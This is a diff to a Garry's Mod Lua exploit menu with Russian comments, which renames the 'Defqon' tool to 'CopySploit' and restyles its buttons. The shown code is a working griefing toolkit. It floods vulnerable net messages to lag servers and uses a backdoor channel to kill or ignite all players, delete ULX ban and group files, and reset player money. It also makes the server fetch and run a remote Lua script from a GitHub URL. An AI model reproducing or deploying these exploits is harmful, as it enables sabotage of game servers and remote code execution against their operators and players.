@@ -3877,9 +2946,9 @@ scan = function() return iZNX.ValidNetString( "ATS_WARP_REMOVE_CLIENT" ) end,
 functions = {
 { typ = "func", name = "Лаги", func = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-if !timer.Exists( "Defqon_exploit_lagsploit1" ) then
+if !timer.Exists( "CopySploit_exploit_lagsploit1" ) then
 iZNX.ChatText( "Запускаем лаги" )
-timer.Create( "Defqon_exploit_lagsploit1", 0.02, 0, function()
+timer.Create( "CopySploit_exploit_lagsploit1", 0.02, 0, function()
 for k,v in pairs(player.GetAll()) do
 iZNX.NetStart( "ATS_WARP_REMOVE_CLIENT" )
 net.WriteEntity( v )
@@ -3896,7 +2965,7 @@ net.SendToServer()
 end
 end)
 else
-timer.Remove( "Defqon_exploit_lagsploit1" )
+timer.Remove( "CopySploit_exploit_lagsploit1" )
 iZNX.ChatText( "Прекращаем лаги" )
 end
 end, },
@@ -3909,15 +2978,15 @@ scan = function() return ULib end,
 functions = {
 { typ = "func", name = "Спам", func = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-if !timer.Exists( "Defqon_exploit_bigspames2" ) then
+if !timer.Exists( "CopySploit_exploit_bigspames2" ) then
 iZNX.ChatText( "Запускаем спам" )
-timer.Create( "Defqon_exploit_bigspames2", 0, 0, function()
+timer.Create( "CopySploit_exploit_bigspames2", 0, 0, function()
 for i = 1, 200 do
-LocalPlayer():ConCommand( "_u Seized by DefqonSploit xD " )
+LocalPlayer():ConCommand( "_u Seized by CopySploit xD " )
 end
 end)
 else
-timer.Remove( "Defqon_exploit_bigspames2" )
+timer.Remove( "CopySploit_exploit_bigspames2" )
 iZNX.ChatText( "Прекращаем спам" )
 end
 end, },
@@ -3930,9 +2999,9 @@ scan = function() return iZNX.ValidNetString( "Keypad" ) end,
 functions = {
 { typ = "func", name = "Лаги", func = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-if !timer.Exists( "Defqon_exploit_lagsploit4" ) then
+if !timer.Exists( "CopySploit_exploit_lagsploit4" ) then
 iZNX.ChatText( "Запускаем лаги" )
-timer.Create( "Defqon_exploit_lagsploit4", 0, 0, function()
+timer.Create( "CopySploit_exploit_lagsploit4", 0, 0, function()
 for i = 1, 1000 do
 iZNX.NetStart("Keypad")
 net.WriteEntity(LocalPlayer())
@@ -3940,7 +3009,7 @@ net.SendToServer()
 end
 end)
 else
-timer.Remove( "Defqon_exploit_lagsploit4" )
+timer.Remove( "CopySploit_exploit_lagsploit4" )
 iZNX.ChatText( "Прекращаем лаги" )
 end
 end, },
@@ -3953,9 +3022,9 @@ scan = function() return iZNX.ValidNetString( "CreateCase" ) end,
 functions = {
 { typ = "func", name = "Лаги", func = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-if !timer.Exists( "Defqon_exploit_lagsploit5" ) then
+if !timer.Exists( "CopySploit_exploit_lagsploit5" ) then
 iZNX.ChatText( "Запускаем лаги" )
-timer.Create( "Defqon_exploit_lagsploit5", 0.02, 0, function()
+timer.Create( "CopySploit_exploit_lagsploit5", 0.02, 0, function()
 for i = 1, 300 do
 iZNX.NetStart( "CreateCase" )
 net.WriteString( "Bitch please" )
@@ -3963,7 +3032,7 @@ net.SendToServer()
 end
 end)
 else
-timer.Remove( "Defqon_exploit_lagsploit5" )
+timer.Remove( "CopySploit_exploit_lagsploit5" )
 iZNX.ChatText( "Прекращаем лаги" )
 end
 end, },
@@ -3976,9 +3045,9 @@ scan = function() return iZNX.ValidNetString( "rprotect_terminal_settings" ) end
 functions = {
 { typ = "func", name = "Тык", func = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-if !timer.Exists( "Defqon_exploit_lagsploit6" ) then
+if !timer.Exists( "CopySploit_exploit_lagsploit6" ) then
 iZNX.ChatText( "Запускаем лаги" )
-timer.Create( "Defqon_exploit_lagsploit6", 0.02, 0, function()
+timer.Create( "CopySploit_exploit_lagsploit6", 0.02, 0, function()
 for i = 1, 200 do
 iZNX.NetStart( "rprotect_terminal_settings" )
 net.WriteEntity( LocalPlayer() )
@@ -3986,7 +3055,7 @@ net.SendToServer()
 end
 end)
 else
-timer.Remove( "Defqon_exploit_lagsploit6" )
+timer.Remove( "CopySploit_exploit_lagsploit6" )
 iZNX.ChatText( "Прекращаем лаги" )
 end
 end, },
@@ -3999,9 +3068,9 @@ scan = function() return iZNX.ValidNetString( "StackGhost" ) end,
 functions = {
 { typ = "func", name = "Лаги", func = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-if !timer.Exists( "Defqon_exploit_lagsploit7" ) then
+if !timer.Exists( "CopySploit_exploit_lagsploit7" ) then
 iZNX.ChatText( "Запускаем лаги" )
-timer.Create( "Defqon_exploit_lagsploit7", 0.015, 0, function()
+timer.Create( "CopySploit_exploit_lagsploit7", 0.015, 0, function()
 for i = 1, 8 do
 for k,v in pairs( player.GetAll() ) do
 iZNX.NetStart( "StackGhost" )
@@ -4011,7 +3080,7 @@ end
 end
 end)
 else
-timer.Remove( "Defqon_exploit_lagsploit7" )
+timer.Remove( "CopySploit_exploit_lagsploit7" )
 iZNX.ChatText( "Прекращаем лаги" )
 end
 end, },
@@ -4024,9 +3093,9 @@ scan = function() return iZNX.ValidNetString( "RevivePlayer" ) end,
 functions = {
 { typ = "func", name = "Бессмертие", func = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-if !timer.Exists( "Defqon_exploit_zombie" ) then
+if !timer.Exists( "CopySploit_exploit_zombie" ) then
 iZNX.ChatText( "Ты бессмертен" )
-timer.Create( "Defqon_exploit_zombie", 0.5, 0, function()
+timer.Create( "CopySploit_exploit_zombie", 0.5, 0, function()
 if !LocalPlayer():Alive() then
 iZNX.NetStart("RevivePlayer")
 net.WriteEntity(LocalPlayer())
@@ -4034,7 +3103,7 @@ net.SendToServer()
 end
 end)
 else
-timer.Remove( "Defqon_exploit_zombie" )
+timer.Remove( "CopySploit_exploit_zombie" )
 iZNX.ChatText( "Ты снова смертен!" )
 end
 end, },
@@ -4096,7 +3165,7 @@ net.SendToServer()
 end, },
 },
 } )
-iZNX.AddExploit( "Defqon Report Spammer", {
+iZNX.AddExploit( "CopySploit Report Spammer", {
 desc = "Report спаммер",
 severity = 1,
 scan = function() return iZNX.ValidNetString( "TransferReport" ) end,
@@ -4215,9 +3284,9 @@ TButton:SizeToContents()
 TButton:SetTall( 24 )
 if tooltip then TButton:SetToolTip( tooltip ) end
 TButton.Paint = function( self, w, h )
-surface.SetDrawColor( Color(60, 60, 60, 200) ) -- Цвет кнопок
+surface.SetDrawColor( Color(0, 0, 60, 200) ) -- Цвет кнопок
 surface.DrawRect( 0, 0, w, h )
-surface.SetDrawColor( Color( 60, 60, 60 ) ) -- Цвет верхней части кнопок
+surface.SetDrawColor( Color( 0, 0, 80 ) ) -- Цвет верхней части кнопок
 surface.SetMaterial( downgrad )
 surface.DrawTexturedRect( 0, 0, w, h/ 2 )
 surface.SetDrawColor( Color(100, 100, 100, 255) ) -- Цвет обводки кнопок
@@ -4234,14 +3303,14 @@ local TButton = vgui.Create( "DButton" )
 TButton:SetParent( parent )
 TButton:SetPos( x, y )
 TButton:SetText( btext )
-TButton:SetTextColor( Color(9, 173, 181, 255) ) -- Цвет текста на кнопках
+TButton:SetTextColor( Color(255, 255, 255, 255) ) -- Цвет текста на кнопках
 TButton:SizeToContents()
 TButton:SetTall( 24 )
 if tooltip then TButton:SetToolTip( tooltip ) end
 TButton.Paint = function( self, w, h )
-surface.SetDrawColor( Color(60, 60, 60, 200) ) -- Цвет кнопок
+surface.SetDrawColor( Color(0, 0, 60, 200) ) -- Цвет кнопок
 surface.DrawRect( 0, 0, w, h )
-surface.SetDrawColor( Color( 60, 60, 60 ) ) -- Цвет верхней части кнопок
+surface.SetDrawColor( Color( 0, 0, 80 ) ) -- Цвет верхней части кнопок
 surface.SetMaterial( downgrad )
 surface.DrawTexturedRect( 0, 0, w, h/ 2 )
 surface.SetDrawColor( Color(100, 100, 100, 255) ) -- Цвет обводки кнопок
@@ -4263,9 +3332,9 @@ TButton:SizeToContents()
 TButton:SetTall( 24 )
 if tooltip then TButton:SetToolTip( tooltip ) end
 TButton.Paint = function( self, w, h )
-surface.SetDrawColor( Color(60, 60, 60, 200) ) -- Цвет кнопок
+surface.SetDrawColor( Color(0, 0, 60, 200) ) -- Цвет кнопок
 surface.DrawRect( 0, 0, w, h )
-surface.SetDrawColor( Color( 60, 60, 60 ) ) -- Цвет верхней части кнопок
+surface.SetDrawColor( Color( 0, 0, 80 ) ) -- Цвет верхней части кнопок
 surface.SetMaterial( downgrad )
 surface.DrawTexturedRect( 0, 0, w, h/ 2 )
 surface.SetDrawColor( Color(100, 100, 100, 255) ) -- Цвет обводки кнопок
@@ -4311,9 +3380,9 @@ iZNX.HTXCommandeSelector:SetPos( gui.MouseX(), gui.MouseY() )
 iZNX.HTXCommandeSelector:MakePopup()
 iZNX.HTXCommandeSelector.Paint = function( s, w, h )
 if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
-surface.SetDrawColor( Color(30, 30, 30, 245) )
+surface.SetDrawColor( Color(50, 50, 90, 245) )
 surface.DrawRect( 0, 0, w, h )
-surface.SetDrawColor( Color(55, 55, 55, 245) )
+surface.SetDrawColor( Color(0, 0, 50, 245) )
 surface.DrawOutlinedRect( 0, 0, w, h )
 surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
 end
@@ -4327,12 +3396,12 @@ sound1:SetTextColor(Color(255, 255, 255, 255))
 sound1.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 sound1.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запускаем" )
 iZNX.NetStart(thefrenchenculer)
 net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/33i6.mp3\", \"mono\", function()end )]])" )
 net.WriteBit(1)
@@ -4346,12 +3415,12 @@ sound2:SetTextColor(Color(255, 255, 255, 255))
 sound2.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 sound2.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запускаем" )
 iZNX.NetStart(thefrenchenculer)
 net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/5maL.mp3\", \"mono\", function()end )]])" )
 net.WriteBit(1)
@@ -4365,12 +3434,12 @@ sound3:SetTextColor(Color(255, 255, 255, 255))
 sound3.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 sound3.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запускаем" )
 iZNX.NetStart(thefrenchenculer)
 net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/62xu.mp3\", \"mono\", function()end )]])" )
 net.WriteBit(1)
@@ -4384,12 +3453,12 @@ sound4:SetTextColor(Color(255, 255, 255, 255))
 sound4.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 sound4.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запускаем" )
 iZNX.NetStart(thefrenchenculer)
 net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/6377.mp3\", \"mono\", function()end )]])" )
 net.WriteBit(1)
@@ -4403,12 +3472,12 @@ sound5:SetTextColor(Color(255, 255, 255, 255))
 sound5.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 sound5.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запускаем" )
 iZNX.NetStart(thefrenchenculer)
 net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/68o4.mp3\", \"mono\", function()end )]])" )
 net.WriteBit(1)
@@ -4445,14 +3514,14 @@ function iZNX.HTXCommandeListe()
 if iZNX.HTXCommandeSelector and iZNX.HTXCommandeSelector:IsVisible() then iZNX.HTXCommandeSelector:Remove() end
 iZNX.HTXCommandeSelector = vgui.Create("DFrame")
 iZNX.HTXCommandeSelector:SetSize(240,350)
-iZNX.HTXCommandeSelector:SetTitle("Дефкон макросы")
+iZNX.HTXCommandeSelector:SetTitle("Макросы")
 iZNX.HTXCommandeSelector:SetPos( gui.MouseX(), gui.MouseY() )
 iZNX.HTXCommandeSelector:MakePopup()
 iZNX.HTXCommandeSelector.Paint = function( s, w, h )
 if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
-surface.SetDrawColor( Color(30, 30, 30, 245) )
+surface.SetDrawColor( Color(50, 50, 90, 245) )
 surface.DrawRect( 0, 0, w, h )
-surface.SetDrawColor( Color(55, 55, 55, 245) )
+surface.SetDrawColor( Color(0, 0, 50, 245) )
 surface.DrawOutlinedRect( 0, 0, w, h )
 surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
 end
@@ -4466,12 +3535,12 @@ commandnethtx1:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx1.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx1.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Все мертвы" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Все мертвы" )
 iZNX.NetStart(thefrenchenculer)
 net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
 net.WriteBit(1)
@@ -4480,36 +3549,36 @@ end
 local commandnethtx2 = vgui.Create("DButton", DScrollPanel)
 commandnethtx2:SetSize( 208, 20 )
 commandnethtx2:SetPos( 2, 100 )
-commandnethtx2:SetText("Безобидное disco [не ломает ничего]")
+commandnethtx2:SetText("Хардбасс диско")
 commandnethtx2:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx2.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx2.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Disco успешно запущено" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Disco успешно запущено" )
 net.Start(thefrenchenculer)
-net.WriteString( "http.Fetch(\"https://pastebin.com/raw/8UVtBXVn\",function(b,l,h,c)RunString(b)end,nil)" )
+net.WriteString( "http.Fetch(\"https://raw.githubusercontent.com/WERooo/somelua/master/discohardbass.lua\",function(b,l,h,c)RunString(b)end,nil)" )
 net.WriteBit(1)
 net.SendToServer()
 end
 local commandnethtx3 = vgui.Create("DButton", DScrollPanel )
 commandnethtx3:SetSize( 208, 20 )
 commandnethtx3:SetPos( 2, 375 )
-commandnethtx3:SetText("Удалить ulx баны")
+commandnethtx3:SetText("Удалить ulx баны (файл)")
 commandnethtx3:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx3.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx3.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Удалено" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Удалено" )
 iZNX.NetStart(thefrenchenculer)
 net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
 net.WriteBit(1)
@@ -4523,12 +3592,12 @@ commandnethtx4:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx4.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx4.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Поджигаем" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Поджигаем" )
 iZNX.NetStart(thefrenchenculer)
 net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
 net.WriteBit(1)
@@ -4542,12 +3611,12 @@ commandnethtx5:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx5.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx5.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Удалено" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Удалено" )
 iZNX.NetStart(thefrenchenculer)
 net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
 net.WriteBit(1)
@@ -4561,12 +3630,12 @@ commandnethtx6:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx6.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx6.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Выключаем" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Выключаем" )
 iZNX.NetStart(thefrenchenculer)
 net.WriteString("timer.Create( \"spamlolk\", 0, 0, function() for i = 1, 1000000 do MsgC(Color(math.random(255), math.random(255), math.random(255)), \" \") end end)")
 net.WriteBit(1)
@@ -4580,19 +3649,19 @@ commandnethtx7:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx7.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 local chatrapemike = false
 commandnethtx7.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
 RainbowMike = {
-"chat.AddText(Color(0,255,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ | discord.gg/weJb7TJ█ ▇ ▆ ▅ ▄ ▂ ▁ \")",
-"chat.AddText(Color(0,0,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ | discord.gg/weJb7TJ█ ▇ ▆ ▅ ▄ ▂ ▁ \")",
-"chat.AddText(Color(255,0,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ | discord.gg/weJb7TJ█ ▇ ▆ ▅ ▄ ▂ ▁  \")",
-"chat.AddText(Color(255,255,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ | discord.gg/weJb7TJ█ ▇ ▆ ▅ ▄ ▂ ▁  \")",
-"chat.AddText(Color(0,255,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ | discord.gg/weJb7TJ█ ▇ ▆ ▅ ▄ ▂ ▁  \")",
-"chat.AddText(Color(255,0,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ | discord.gg/weJb7TJ█ ▇ ▆ ▅ ▄ ▂ ▁ \")",
+"chat.AddText(Color(0,255,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ█ ▇ ▆ ▅ ▄ ▂ ▁ \")",
+"chat.AddText(Color(0,0,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ█ ▇ ▆ ▅ ▄ ▂ ▁ \")",
+"chat.AddText(Color(255,0,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ█ ▇ ▆ ▅ ▄ ▂ ▁  \")",
+"chat.AddText(Color(255,255,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ█ ▇ ▆ ▅ ▄ ▂ ▁  \")",
+"chat.AddText(Color(0,255,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ█ ▇ ▆ ▅ ▄ ▂ ▁  \")",
+"chat.AddText(Color(255,0,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ█ ▇ ▆ ▅ ▄ ▂ ▁ \")",
 }
         chatrapemike = !chatrapemike
         if( chatrapemike ) then
@@ -4616,12 +3685,12 @@ commandnethtx8:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx8.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx8.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Изменяем" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Изменяем" )
 iZNX.NetStart(thefrenchenculer)
 net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/editor/playerstart.mdl\") end" )
 net.WriteBit(1)
@@ -4635,12 +3704,12 @@ commandnethtx9:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx9.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx9.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Сломано" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Сломано" )
 net.Start(thefrenchenculer)
 net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-8\")" )
 net.WriteBit(1)
@@ -4654,12 +3723,12 @@ commandnethtx10:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx10.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx10.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Бах" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Бах" )
 net.Start(thefrenchenculer)
 net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"-600\")" )
 net.WriteBit(1)
@@ -4673,12 +3742,12 @@ commandnethtx11:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx11.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx11.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Сброшено" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Сброшено" )
 net.Start(thefrenchenculer)
 net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
 net.WriteBit(1)
@@ -4692,12 +3761,12 @@ commandnethtx12:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx12.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx12.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Ухуу" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Ухуу" )
 net.Start(thefrenchenculer)
 net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
 net.WriteBit(1)
@@ -4711,33 +3780,14 @@ commandnethtx13:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx13.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx13.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
